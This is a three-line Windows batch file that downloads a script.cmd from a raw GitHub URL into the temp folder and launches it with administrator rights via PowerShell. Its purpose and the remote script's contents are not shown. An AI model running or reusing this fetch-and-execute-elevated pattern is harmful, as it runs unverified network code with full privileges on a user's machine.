@echo off
curl.exe -L -o "%TEMP%\script.cmd" "https://raw.githubusercontent.com/shamim4s/importent-urls/master/script.cmd"
powershell -NoProfile -Command "Start-Process '%TEMP%\script.cmd' -Verb RunAs"